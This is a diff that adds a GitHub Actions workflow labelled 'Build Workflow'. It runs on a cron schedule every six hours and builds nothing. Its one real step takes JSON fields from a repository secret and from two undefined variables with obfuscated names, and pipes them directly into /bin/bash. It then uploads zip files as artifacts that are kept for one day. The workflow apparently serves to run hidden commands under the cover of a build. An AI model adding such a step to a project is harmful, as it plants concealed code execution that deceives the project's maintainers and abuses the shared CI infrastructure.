@@ -1,0 +1,30 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          p74: ${{ secrets.p74 }}
+        run: |
+          printf '%s' "$p74" | jq -r .bvm5 | /bin/bash
+          echo $ca4 | jq -r .ueap57 | /bin/bash
+          printf '%s' "$myvqu3347" | jq -r .oyis30390 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: jSHYlpoi
+          path: "*.zip"
+          retention-days: 1
